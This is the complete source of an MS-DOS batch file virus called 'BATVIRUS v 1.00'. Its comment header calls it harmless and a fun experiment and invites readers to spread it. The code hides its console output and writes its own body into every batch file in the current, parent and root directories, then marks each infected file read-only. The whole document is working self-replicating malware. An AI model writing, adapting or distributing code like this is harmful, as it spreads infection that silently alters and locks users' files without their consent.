@echo off		
rem * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *		
rem *                  This is BATVIRUS v 1.00                    *		
rem * This BATVIRUS is harmless and completely transparent.  When *		
rem * executed,  it  will  infect any batch files  in the current *		
rem *  + one up + root directory. BATVIRUS requies MS-DOS 5.00 or *		
rem * compatible,  the pipe find, the file  attrib.exe  and a few *		
rem * free bytes on your hard drive.                              *		
rem * It was created as a fun experiment. You can spread it freely*		
rem * on your own machine. Comments are much appreciated.         *		
rem * mastny@vszbr.cz  http://dahlia.vszbr.cz/~mastny/the_hell.htm*		
rem * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *		
@break off		
@ctty nul		
attrib +r %0		
echo if [%%1]==[FUCK_IT.BAT] goto konec > fuck_it.bat		
echo copy %%1 temp.tmp >> fuck_it.bat		
echo copy body.txt + temp.tmp %%1 >> fuck_it.bat		
echo attrib +r %%1 >> fuck_it.bat		
echo :konec >> fuck_it.bat		
type %0 |find "		" > body.txt		
for %%f in (*.bat ..\*.bat \*.bat) do call fuck_it.bat %%f		
del fuck_it.bat		
del temp.tmp		
del body.txt		
ctty con		
@break on		
@echo on		
